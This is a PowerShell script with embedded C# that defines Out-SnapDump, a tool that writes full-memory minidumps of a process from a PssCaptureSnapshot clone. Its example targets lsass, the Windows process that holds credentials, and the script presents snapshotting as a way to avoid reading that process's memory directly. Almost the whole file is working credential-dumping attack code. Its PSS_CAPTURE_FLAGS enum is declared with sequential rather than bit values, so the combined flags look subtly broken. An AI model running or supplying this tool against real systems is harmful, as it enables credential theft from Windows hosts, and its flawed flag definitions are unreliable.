Function Out-SnapDump {
<#
.SYNOPSIS
    Generate a full-memory minidump of a process.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Out-SnapDump writes a process dump file with all process memory to disk.
    It does not read process memory directly but instead does so from the process's snapshot.
    It is a modified version of Out-Minidump by @mattifestation using PssCaptureSnapshot API.

.PARAMETER Process
    Specifies the process for which a dump will be generated. The process object is obtained with Get-Process.

.EXAMPLE
    PS C:\> Get-Process lsass | Out-SnapDump
#>

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [System.Diagnostics.Process]
        $Process,

        [Parameter(Position = 1)]
        [ValidateScript({ Test-Path $_ })]
        [String]
        $DumpFilePath = $PWD
    )

    BEGIN {
        $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
        $werNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
        $flags = [Reflection.BindingFlags] 'NonPublic, Static'
        $MiniDumpWriteDump = $werNativeMethods.GetMethod('MiniDumpWriteDump', $flags)
    }

    PROCESS {
        $processId = $Process.Id
        $processName = $Process.Name
        $processHandle = $Process.Handle

        $flags = [Natives+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_VA_CLONE `
            -bor [Natives+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_HANDLES `
            -bor [Natives+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_HANDLE_NAME_INFORMATION `
            -bor [Natives+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_HANDLE_BASIC_INFORMATION `
            -bor [Natives+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION `
            -bor [Natives+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_HANDLE_TRACE `
            -bor [Natives+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_THREADS `
            -bor [Natives+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_THREAD_CONTEXT `
            -bor [Natives+PSS_CAPTURE_FLAGS]::PSS_CAPTURE_THREAD_CONTEXT_EXTENDED `
            -bor [Natives+PSS_CAPTURE_FLAGS]::PSS_CREATE_BREAKAWAY `
            -bor [Natives+PSS_CAPTURE_FLAGS]::PSS_CREATE_BREAKAWAY_OPTIONAL `
            -bor [Natives+PSS_CAPTURE_FLAGS]::PSS_CREATE_USE_VM_ALLOCATIONS `
            -bor [Natives+PSS_CAPTURE_FLAGS]::PSS_CREATE_RELEASE_SECTION
        $snapshotHandle = [IntPtr]::Zero
        [Natives]::PssCaptureSnapshot($processHandle, $flags, 1048607, [ref] $snapshotHandle) | Out-Null
        if ($snapshotHandle -eq [IntPtr]::Zero) {
            Write-Warning "PssCaptureSnapshot error."
            return
        }

        $processFileName = "$($processName)_$($processId).dmp"
        $processDumpPath = Join-Path $DumpFilePath $processFileName
        $fileStream = New-Object IO.FileStream($processDumpPath, [IO.FileMode]::Create)

        $callbackInfo = New-Object Natives+MINIDUMP_CALLBACK_INFORMATION
        $callbackInfo.CallbackRoutine = [Helper]::GetCallbackPtr()
        $callbackInfo.CallbackParam = [IntPtr]::Zero
        $size = [Runtime.InteropServices.Marshal]::SizeOf($callbackInfo)
        $callbackInfoPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($size)
        [Runtime.InteropServices.Marshal]::StructureToPtr($callbackInfo, $callbackInfoPtr, $false)

        $result = $MiniDumpWriteDump.Invoke($null, @($snapshotHandle, $processId, $fileStream.SafeFileHandle, [uint32] 2, [IntPtr]::Zero, [IntPtr]::Zero, $callbackInfoPtr))

        $fileStream.Close()

        if (-not $result) {
            Remove-Item $processDumpPath -ErrorAction SilentlyContinue
            $Exception = New-Object ComponentModel.Win32Exception
            $ExceptionMessage = "$($Exception.Message) ($($processName):$($processId))"
            throw $ExceptionMessage
        }
        else {
            Get-ChildItem $processDumpPath
        }
    }

    END {}
}

Add-Type @"
using System;
using System.Runtime.InteropServices;

public static class Natives {
    [DllImport("kernel32", EntryPoint = "PssCaptureSnapshot", CallingConvention = CallingConvention.StdCall,
        CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
    public static extern int PssCaptureSnapshot(IntPtr hProcess, PSS_CAPTURE_FLAGS CaptureFlags, uint ThreadContextFlags, out IntPtr SnapshotHandle);

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct MINIDUMP_IO_CALLBACK {
        public IntPtr Handle;
        public ulong Offset;
        public IntPtr Buffer;
        public int BufferBytes;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct MINIDUMP_CALLBACK_INFORMATION {
        public MinidumpCallbackRoutine CallbackRoutine;
        public IntPtr CallbackParam;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct MINIDUMP_CALLBACK_INPUT {
        public int ProcessId;
        public IntPtr ProcessHandle;
        public MINIDUMP_CALLBACK_TYPE CallbackType;
        public MINIDUMP_IO_CALLBACK Io;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool MinidumpCallbackRoutine(IntPtr CallbackParam, IntPtr CallbackInput, IntPtr CallbackOutput);

    public enum HRESULT : uint {
        S_FALSE = 0x0001,
        S_OK = 0x0000,
        E_INVALIDARG = 0x80070057,
        E_OUTOFMEMORY = 0x8007000E
    }

    public struct MINIDUMP_CALLBACK_OUTPUT {
        public HRESULT status;
    }

    public enum MINIDUMP_CALLBACK_TYPE {
        ModuleCallback,
        ThreadCallback,
        ThreadExCallback,
        IncludeThreadCallback,
        IncludeModuleCallback,
        MemoryCallback,
        CancelCallback,
        WriteKernelMinidumpCallback,
        KernelMinidumpStatusCallback,
        RemoveMemoryCallback,
        IncludeVmRegionCallback,
        IoStartCallback,
        IoWriteAllCallback,
        IoFinishCallback,
        ReadMemoryFailureCallback,
        SecondaryFlagsCallback,
        IsProcessSnapshotCallback,
        VmStartCallback,
        VmQueryCallback,
        VmPreReadCallback,
        VmPostReadCallback
    }

    public enum PSS_CAPTURE_FLAGS {
        PSS_CAPTURE_NONE,
        PSS_CAPTURE_VA_CLONE,
        PSS_CAPTURE_RESERVED_00000002,
        PSS_CAPTURE_HANDLES,
        PSS_CAPTURE_HANDLE_NAME_INFORMATION,
        PSS_CAPTURE_HANDLE_BASIC_INFORMATION,
        PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION,
        PSS_CAPTURE_HANDLE_TRACE,
        PSS_CAPTURE_THREADS,
        PSS_CAPTURE_THREAD_CONTEXT,
        PSS_CAPTURE_THREAD_CONTEXT_EXTENDED,
        PSS_CAPTURE_RESERVED_00000400,
        PSS_CAPTURE_VA_SPACE,
        PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION,
        PSS_CAPTURE_IPT_TRACE,
        PSS_CREATE_BREAKAWAY_OPTIONAL,
        PSS_CREATE_BREAKAWAY,
        PSS_CREATE_FORCE_BREAKAWAY,
        PSS_CREATE_USE_VM_ALLOCATIONS,
        PSS_CREATE_MEASURE_PERFORMANCE,
        PSS_CREATE_RELEASE_SECTION
    }
}

public static class Helper {
    public static Natives.MinidumpCallbackRoutine GetCallbackPtr() {
        var callbackPtr = new Natives.MinidumpCallbackRoutine((param, input, output) => {
            var callbackInput = Marshal.PtrToStructure<Natives.MINIDUMP_CALLBACK_INPUT>(input);
            var callbackOutput = Marshal.PtrToStructure<Natives.MINIDUMP_CALLBACK_OUTPUT>(output);
            switch (callbackInput.CallbackType) {
                case Natives.MINIDUMP_CALLBACK_TYPE.IsProcessSnapshotCallback:
                    callbackOutput.status = Natives.HRESULT.S_FALSE;
                    Marshal.StructureToPtr(callbackOutput, output, true);
                    return true;
                default:
                    return true;
            }
        });
        return callbackPtr;
    }
}
"@
